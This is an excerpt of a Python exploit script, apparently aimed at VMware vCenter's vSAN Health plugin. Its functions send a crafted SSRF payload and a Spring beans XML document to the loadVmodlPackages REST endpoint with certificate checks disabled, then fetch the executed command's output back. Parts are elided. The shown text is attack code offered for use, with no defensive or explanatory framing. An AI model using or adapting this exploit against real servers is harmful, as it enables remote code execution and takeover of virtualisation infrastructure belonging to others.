...
error_xml = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
...
def do_attack(target, payload):
    try:
        url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
        # url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/createContext"
        post_json = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))]]}
        # post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
        result = req.post(url=url, headers=headers, json=post_json, verify=False)
        return result
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None
...
def get_echo(target):
    try:
        ...
        post_json = {"methodInput": ["output", None]}
        result = req.post(url=url, headers=headers, json=post_json, verify=False)
        return result
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
